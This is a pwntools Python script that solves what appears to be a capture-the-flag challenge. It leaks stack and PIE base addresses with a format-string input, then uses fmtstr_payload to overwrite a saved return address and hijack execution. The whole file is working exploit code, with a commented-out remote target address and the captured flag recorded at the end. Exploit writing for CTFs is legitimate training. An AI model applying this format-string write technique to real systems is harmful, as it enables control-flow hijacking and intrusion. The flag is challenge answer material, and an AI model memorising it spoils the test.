from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./vuln', '''
    b *(main+115)
    b *(main+154)
    continue
''')

# p = remote('74.207.229.59', 20221)

p.recvuntil(b'Haha my buffer cant be overflowed and there is pie, ill even let you read and print twice\n')

p.sendline(b'%9$p%27$p')
leaks = p.recvline().strip().decode()
rsp_value = int(leaks[0:14], 16) - 0x48
log.info(f'rsp value: {hex(rsp_value)}')
elf_base_addr = int(leaks[14:], 16) - 0x11b3
log.info(f'elf base address: {hex(elf_base_addr)}')

context.bits = 64
payload = fmtstr_payload(6, {rsp_value+0x88:elf_base_addr+0x118d})
p.sendline(payload)

p.interactive()

# texsaw{Pr1nt1ng_tHe_Fs_15_e4sy}